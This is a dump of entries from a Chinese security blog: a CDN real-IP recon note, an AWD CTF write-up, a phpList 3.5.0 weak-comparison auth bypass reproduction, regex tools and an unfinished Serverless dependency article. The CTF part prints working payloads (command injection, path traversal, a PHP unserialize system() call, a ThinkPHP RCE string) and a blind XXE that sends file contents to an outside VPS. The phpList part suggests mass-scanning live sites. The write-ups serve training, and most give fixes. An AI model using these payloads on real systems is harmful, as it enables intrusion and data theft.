rel="noopener">https://github.com/search/advanced</a></p><p><strong>注意事项</strong>：</p><ul><li><strong>冒号<code>:</code>两侧不能有空格</strong></li><li><strong>不区分大小写</strong></li><li><strong>不能将以下通配符用作搜索查询的一部分，搜索将忽略这些符号：. , : ; / \ ` ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]</strong></li><li><strong>搜索默认为master分支</strong></li></ul><p>fofa：<a href="https://zhuanlan.zhihu.com/p/46245762" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46245762</a></p><p>Google hacking</p><p>shodan</p><p>zoomeye：<a href="https://www.zhihu.com/question/23389858" target="_blank" rel="noopener">https://www.zhihu.com/question/23389858</a></p><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><h3 id="判断是否使用了CDN"><a href="#判断是否使用了CDN" class="headerlink" title="判断是否使用了CDN"></a>判断是否使用了CDN</h3><h4 id="全球ping检测"><a href="#全球ping检测" class="headerlink" title="全球ping检测"></a>全球ping检测</h4><p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p><p><a href="https://wepcc.com/" target="_blank" rel="noopener">https://wepcc.com/</a></p><h4 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h4><p><a href="https://site.ip138.com/" target="_blank" rel="noopener">https://site.ip138.com/</a></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213111219.png" alt></p><h3 id="绕过CDN查询真实IP"><a href="#绕过CDN查询真实IP" class="headerlink" title="绕过CDN查询真实IP"></a>绕过CDN查询真实IP</h3><h4 id="VirusTotal"><a href="#VirusTotal" class="headerlink" title="VirusTotal"></a>VirusTotal</h4><p>大名鼎鼎的 <code>VirusTotal</code>，支持恶意文件，恶意URL的检测，也可以绕过CDN查询真实IP</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213114115.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200213114138.png" alt></p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><ul><li><p><strong>子域名IP</strong></p><p>由于成本问题，可能某些厂商并不会将所有的子域名都部署 CDN，所以如果我们能尽量的搜集子域名，或许可以找到一些没有部署 CDN 的子域名，拿到某些服务器的真实 <code>ip/ 段</code></p></li><li><p><strong>旁站IP</strong></p><p>whois查询域名所有者的其他域名，可能与目标域名在同一个服务器上，并且未作CDN</p></li><li><p><strong>查找泄露文件</strong></p><p><code>phpinfo</code>、<code>GitHub泄露等</code></p></li><li><p><strong>利用目标网站<code>证书</code>或者<code>favicon.ico</code></strong></p><p>在<code>https://crt.sh</code>查找网站SSL证书的<code>hash</code>，然后再用censys搜索</p><p>利用<code>favicon.ico</code>和<code>shodan</code>：<a href="https://github.com/Ridter/get_ip_by_ico" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>星盟AWD系列邀请赛复盘</title>
      <link href="/passages/2020-2-9-%E6%98%9F%E7%9B%9FAWD%E7%B3%BB%E5%88%97%E9%82%80%E8%AF%B7%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
      <url>/passages/2020-2-9-%E6%98%9F%E7%9B%9FAWD%E7%B3%BB%E5%88%97%E9%82%80%E8%AF%B7%E8%B5%9B%E5%A4%8D%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感谢星盟安全团队的邀请！</p></blockquote><a id="more"></a><h2 id="2-9"><a href="#2-9" class="headerlink" title="2.9"></a>2.9</h2><p>2月9号星盟安全团队举办的线上AWD，三道Web题，两道pwn题。又学到了很多新姿势。</p><p>记录下三道Web题中我们发现的漏洞和做题过程。</p><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>上D盾：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220003.png" alt></p><h4 id="test-php中的预置后门："><a href="#test-php中的预置后门：" class="headerlink" title="test.php中的预置后门："></a><code>test.php</code>中的预置后门：</h4><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220253.png" alt></p><p>赶紧<strong>删文件</strong>，写个脚本批量打。</p><p><strong>payload</strong>：<code>http://39.100.119.37:10480/test.php?out=cat /flag</code></p><h4 id="shell-函数的命令执行漏洞"><a href="#shell-函数的命令执行漏洞" class="headerlink" title="shell()函数的命令执行漏洞"></a>shell()函数的命令执行漏洞</h4><p>在<code>admin/func.php</code>中存在有漏洞的<code>shell</code>函数：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220549.png" alt></p><p><strong>如何快速发现哪个文件调用了shell函数</strong>？</p><p>熟悉代码审计的师傅应该知道<code>ctags</code>和<code>在文件夹中搜索</code>这两个功能。</p><ul><li><p><code>ctags</code>就是定位被调用函数的定义文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220939.png" alt></p><p>这样就能快速找到定义这个函数的文件所在行。</p></li><li><p><code>在文件夹中搜索</code>是一般编辑器都有的功能</p><p>我使用<code>sublime</code>，在文件夹中搜索<code>shell</code>，很快就发现在哪处调用了该函数</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221209.png" alt></p></li></ul><p>利用该漏洞需要先登录后台</p><p>后台登录账号密码：<code>admin111</code>:<code>admin111</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221354.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221403.png" alt></p><p><strong>payload</strong>：<code>?shell&amp;out=127.0.0.1;cat /flag</code></p><p><strong>修复方案</strong>：过滤out参数，如果其含有flag字样，直接<code>exit();</code>（这样不严谨，但当时时间紧迫，先这样处理）</p><p>更好的修复方案，shell完成的功能是<code>ping</code>命令，那么我们就使用正则来过滤输入的参数是否是正常的域名或者IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h4 id="假的预置后门"><a href="#假的预置后门" class="headerlink" title="假的预置后门"></a>假的预置后门</h4><p>同Web1一样，在网站根目录下有一个<code>test.php</code>的假后门</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221725.png" alt></p><p>一开始D盾扫到还挺兴奋的，但利用起来完全没作用</p><p>源码中已经输出了<code>$_</code>、<code>$__</code>、<code>$___</code>的值，跟注释中的<code>$_=&#39;assert&#39;;</code>完全不一样，大概就是出题人皮了一下。</p><p>pass掉。</p><h4 id="目录跳转漏洞"><a href="#目录跳转漏洞" class="headerlink" title="目录跳转漏洞"></a>目录跳转漏洞</h4><p><code>admin/grade.php</code>中，接收文件名，并将文件内容输出到浏览器</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222506.png" alt></p><p><strong>payload</strong>：<code>http://39.100.119.37:21680/admin/grade.php?file=../../../../flag</code></p><p><strong>修复方案</strong>：正则匹配<code>..</code>，防止目录遍历</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222935.png" alt></p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p><code>login/logout.php</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209223250.png" alt></p><p>比较简单的反序列化利用</p><p><strong>payload</strong>：<code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:4:&quot;male&quot;;s:15:&quot;system(&#39;cat /flag&#39;);&quot;;}</code></p><p><strong>修复方案</strong>：多余的操作，直接删除<code>unserialize($_POST[&#39;un&#39;]);</code></p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>Web3的MySQL服务一直有问题，直到比赛结束前半个小时才恢复。</p><h4 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h4><p><code>loginCheck.php</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209230947.png" alt></p><p>登录是通过XML传递<code>username</code>和<code>password</code>参数，而传递的xml我们可控，没有回显，盲XXE读取文件。</p><p>XML：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://47.112.16.34/xml.dtd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;aaa&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>外部<code>DTD</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://47.112.16.34:1337/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>在VPS上监听 <code>nc -lp 1337 -vv</code></p><p>抓包请求：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231527.png" alt></p><p>VPS接收到请求：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231654.png" alt></p><p>关于盲XXE更多参考学习：<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>赛后在群里看了下其他师傅分享的思路，不得不服，被骚到了。。最重要的还是权限维持。</p><p>骚思路：</p><p>建立<code>软链接文件</code>到<code>/flag</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209232517.png" alt></p><p>还有发现平台漏洞，拿到所有主机的登录密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200210144759.jpg" alt></p><p>太强了，向师傅们学习！</p><h2 id="3-14"><a href="#3-14" class="headerlink" title="3.14"></a>3.14</h2><p>特别感谢星盟安全团队3月的AWD邀请赛！</p><p>这次我们团队有几个选手因为有事耽误了，没有参加，导致我们人手不太够。后面环境也出现了不同程度的问题：环境经常崩、无法重置容器等。不过还是特别感谢星盟安全团队，辛苦运维小哥们了！</p><h3 id="Web2-1"><a href="#Web2-1" class="headerlink" title="Web2"></a>Web2</h3><p>Web2是最先开放环境的</p><h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>拷贝源码到本地 -&gt; 上日志监控脚本 -&gt; 上文件监控脚本等等</p><h4 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h4><p>直接访问<code>login.php</code>，左下角就存在flag</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314231159.png" alt></p><h4 id="登录login-php"><a href="#登录login-php" class="headerlink" title="登录login.php"></a>登录login.php</h4><p>很多队伍没有修改默认登录账号密码，导致默认登录后拿到flag</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314231321.png" alt></p><p>主要就是这两个洞在这刷，由于今天人手不太够，也没有怎么维持权限。</p><h3 id="Web3-1"><a href="#Web3-1" class="headerlink" title="Web3"></a>Web3</h3><p>Web3的洞挺多的，就是环境问题导致几个洞用不了，也可能是我们操作不当。</p><h4 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h4><p>首先前期准备工作做好，源码拷贝下来后发现存在<code>readme.md</code>，我还以为是在GitHub上下载的某个cms，就没有打开这个<code>readme</code>。后来D盾扫到了这个文件存在危险函数，一看，一句话木马。。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232108.png" alt></p><p>傻傻的还以为要寻找文件包含漏洞，要是找到了文件包含，这个文件也早被删了。。知道看到<code>.htaccess</code>的内容，原来可以直接用！赶紧刷一波（很快就没了）</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232137.png" alt></p><h4 id="命令执行-反序列化"><a href="#命令执行-反序列化" class="headerlink" title="命令执行 反序列化"></a>命令执行 反序列化</h4><p><code>common</code>目录中的<code>function.php</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232401.png" alt></p><p>先把自己的洞给修了，采用正则来匹配输入的是否是合法的IP/域名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure><p>结果去利用别人的洞的时候，发现怎么使都不成功，试了很多队伍，一致以为是环境问题导致的PHP脚本没有正常执行。。</p><p>同目录下 <code>home.php</code> 中存在反序列化漏洞。感觉和上次（2月）的题目很像啊。。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200314232725.png" alt></p><h3 id="Web1-1"><a href="#Web1-1" class="headerlink" title="Web1"></a>Web1</h3><p>Web1是黑盒测试，比赛大概进行了半个小时放出Web1的环境。</p><p>一上来随便一测，就是个TP环境，报错看下TP版本：<code>5.0.9</code>，直接RCE：</p><p><code>?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=more%20/flag</code></p><p>一开始试的<code>cat /flag</code>，好像返回结果有点问题，就换成了<code>more</code>。</p><p>当时没有怎么想着维持权限，只是反弹一个自己团队shell，把洞给修了。</p><p>下次遇到这种黑盒的，就直接拿到所有队伍的<code>meterpreter shell</code>，放在后台，这样维权比较方便长久。（希望不会卡。。）</p><p>后来莫名访问量<code>.config.php</code>，没想到直接骑上别人的马了，同网站根目录下的<code>jquery.min.js</code>一样，这两个都是软链接文件，链接到<code>/flag</code>。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这次的比赛准备的挺充足的，赛前我也调试过几个通防脚本。只不过有些脚本的作用还是没有充分发挥。</p><p>比赛人手不够也导致很被动，，</p><p>总之，很感谢星盟安全团队这次锻炼的机会！我们还需要更加努力。</p>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 星盟 </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpList 3.5.0 - Authentication Bypass 漏洞复现</title>
      <link href="/passages/2020-2-8-phpList-3-5-0-Authentication-Bypass-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/passages/2020-2-8-phpList-3-5-0-Authentication-Bypass-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>phpList是用于<strong>管理邮件列表</strong>的开源软件。它设计用于向订户列表传播信息，例如新闻通讯，新闻，广告。它用<strong>PHP编写</strong>，并使用MySQL数据库存储信息。phpList是免费的开源软件。</p><p><a href="https://www.exploit-db.com/exploits/47989" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47989</a></p><p>管理员后台登录的密码散列使用了<code>==</code>而不是<code>===</code>验证</p></blockquote><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>源码下载（sourceforge）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sourceforge.net/projects/phplist/files/phplist-development/3.5.0-RC1/</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209000736.png" alt></p><p>解压后直接找到这个目录：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209233551.png" alt></p><p>将这个<code>lists</code>拷贝到网站目录下并且重命名。</p><p>修改<code>config/config.php</code>配置文件，设置要连接的数据库和账户密码</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209234127.png" alt></p><p>同时建立<code>phplistdb</code>数据库。</p><p>访问<code>http://127.0.0.1/phplist/admin/</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>初始化安装，设置管理员的账号密码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235358.png" alt></p><p>这里的密码要设置成 sha256 后以<code>0e</code>开头的字符串，如 <code>TyNOQHUS</code></p><p>我们再次访问后台，以密码 <code>34250003024812</code>进行登录，其sha256后也是以<code>0e</code>开头</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235609.png" alt></p><p>登录成功：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235804.png" alt></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>找到验证管理员登录的php文件<code>phpListAdminAuthentication.php</code></p><p>关键代码：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209235958.png" alt></p><p>可以看到<code>$encryptedPass</code>（密码sha256后的值）是使用<code>==</code>来判断和数据库中的值是否一样。PHP弱类型比较，就会造成<code>0exxxxx == 0eyyyyy</code>（会把每一个以”0e”开头的哈希值都解释为0）</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>使用<code>===</code>强类型比较：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="comment">//Password validation.</span></span><br><span class="line">            !<span class="keyword">empty</span>($passwordDB) &amp;&amp; $encryptedPass === $passwordDB</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种偶然现象可能不是很常见，但是还是借助fofa等工具搜集下使用phplist的网站，批量打一下。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phplist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式调试工具及常用正则收集</title>
      <link href="/passages/2020-1-18-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E6%94%B6%E9%9B%86/"/>
      <url>/passages/2020-1-18-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/regexp.JPG" alt></p><a id="more"></a><blockquote><p>最近在审计代码的时候，总是遇到很多晦涩难懂的正则表达式</p><p>找了几个正则的调试工具、开发上常用的一些正则表达式</p></blockquote><h2 id="正则表达式调试工具"><a href="#正则表达式调试工具" class="headerlink" title="正则表达式调试工具"></a>正则表达式调试工具</h2><h3 id="regex101"><a href="#regex101" class="headerlink" title="regex101"></a>regex101</h3><p><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></p><p>非常实用丰富的正则调试工具，支持<code>PCRE(PHP)</code>、<code>ECMAScript(JavaScript)</code>、<code>Python</code>、<code>Golang</code>。</p><p><img src="1.png" alt></p><h3 id="debuggex"><a href="#debuggex" class="headerlink" title="debuggex"></a>debuggex</h3><p><a href="https://www.debuggex.com/" target="_blank" rel="noopener">https://www.debuggex.com/</a></p><p>特点：</p><ol><li>支持将正则表达式转化为自动机，并以图片显示自动机</li><li>能够实时更新自动机图片</li><li>支持输入待匹配字符串，良好的调试支持</li></ol><p><img src="2.png" alt></p><h3 id="regexper-和-Regulex"><a href="#regexper-和-Regulex" class="headerlink" title="regexper 和 Regulex"></a>regexper 和 Regulex</h3><p><a href="https://regexper.com/" target="_blank" rel="noopener">https://regexper.com/</a></p><p><a href="https://jex.im/regulex/" target="_blank" rel="noopener">https://jex.im/regulex/</a></p><p>支持将正则表达式转换为自动机，图片显示比较好看hh。</p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><h2 id="常用正则表达式收集"><a href="#常用正则表达式收集" class="headerlink" title="常用正则表达式收集"></a>常用正则表达式收集</h2><p>参考项目：<a href="https://github.com/cdoco/common-regex" target="_blank" rel="noopener">https://github.com/cdoco/common-regex</a></p><h3 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h3><p><a href="mailto:`2362929771@qq.com" target="_blank" rel="noopener">`2362929771@qq.com</a>` 只允许英文字母、数字、下划线、英文句号、以及中划线组成</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0<span class="number">-9</span>_-]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$</span><br></pre></td></tr></table></figure><p><img src="5.png" alt></p><p><code>峰哥fenghlz@foxmail.com</code> 名称允许汉字、字母、数字，域名只允许英文域名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[A-Za-z0<span class="number">-9</span>\u4e00-\u9fa5]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$</span><br></pre></td></tr></table></figure><p><img src="6.png" alt></p><h3 id="电话"><a href="#电话" class="headerlink" title="电话"></a>电话</h3><p><code>13245678990</code> 手机号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^<span class="number">1</span>(<span class="number">3</span>|<span class="number">4</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>)\d&#123;<span class="number">9</span>&#125;$</span><br></pre></td></tr></table></figure><p><img src="7.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Serverless 安全之依赖关系介绍</title>
      <link href="/passages/2019-11-29-Serverless-%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB%E4%BB%8B%E7%BB%8D/"/>
      <url>/passages/2019-11-29-Serverless-%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<blockquote><p>初探一个相当具有潜力的架构的安全性</p></blockquote><p><img src="/Serverless.jpg" alt></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Serverless Framework是无服务器应用框架和生态系统，旨在简化开发和部署AWS Lambda应用程序的工作。Serverless Framework 作为 <strong>Node.js NPM 模块</strong>提供，填补了AWS Lambda 存在的许多缺口。它提供了多个样本模板，可以迅速启动 AWS Lambda 开发。</p></blockquote><p>毫无疑问，在最近的几年里，<strong>微服务</strong>渐渐成为了一个相当流行的架构风格。微服务大致从 2014 年起，开始流行开来。而 <strong>Serverless</strong> 是从 2016 年起，开始受到开发者的关注。并且从其发展趋势来看，它大有可能在几年后，拥有今天微服务一样的地位。可见，它是一个相当具有潜力的架构。</p><p>关于什么是 Serverless 架构以及如何使用它进行应用开发，本文不作其他介绍，感兴趣的同学可以学习：<br><a href="https://serverless.ink/" target="_blank" rel="noopener">Serverless 应用开发指南</a></p><p>本文更多的将从依赖关系的角度探讨无服务器的安全性。</p><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><p>依赖性体现在软件组，我们的软件需要它们才能正确运行。 利用其他软件可以加快开发过程，同样也会不可避免地带来安全问题。 导入一个软件包时，可能会需要导入其他软件包。 </p><p>Node Package Manager（<strong>NPM</strong>）用于管理依赖项。 当我们要向代码中添加软件包时，它将确定所需安装的软件包并对所需的软件包进行适当更改。 NPM这种简单性使我们非常容易安装许多软件包，但可能会更容易将存在漏洞的软件引入我们的代码库。</p><p>有时候我们必须考虑所需软件包中使用的依赖项。 例如，软件需要发出HTTP请求。 可以使用内置的http库，但是代码写起来太麻烦了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    hostname: <span class="string">'www.google.com'</span>,</span><br><span class="line">    port: <span class="number">80</span>,</span><br><span class="line">    path: <span class="string">'/upload'</span>,</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: Buffer.byteLength(postData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> req = http.request(options, (res) =&gt; &#123;</span><br><span class="line">    res.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">    res.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`data: <span class="subst">$&#123;chunk&#125;</span>`</span>);  <span class="comment">// Print the HTML for the Google homepage.</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'No more data in response.'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果是我，我会选择request库，写起来太容易了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line">request(<span class="string">'http://www.google.com'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, response, body</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'error:'</span>, error); <span class="comment">// Print the error if one occurred</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'statusCode:'</span>, response.statusCode); <span class="comment">// Print the response status code if a response was received</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'body:'</span>, body); <span class="comment">// Print the HTML for the Google homepage.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用request库所需的代码行少得多。 但也并不是特别好， 该库需要另外20个软件包才能有效地工作， 观察依赖关系树时，总共有49个依赖关系。 </p><p><img src="1.png" alt></p><p>查询依赖关系的工具：<a href="http://npm.anvaka.com/#!/" target="_blank" rel="noopener">http://npm.anvaka.com/#!/</a></p><p>got库是另一种代替http库的方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> got(<span 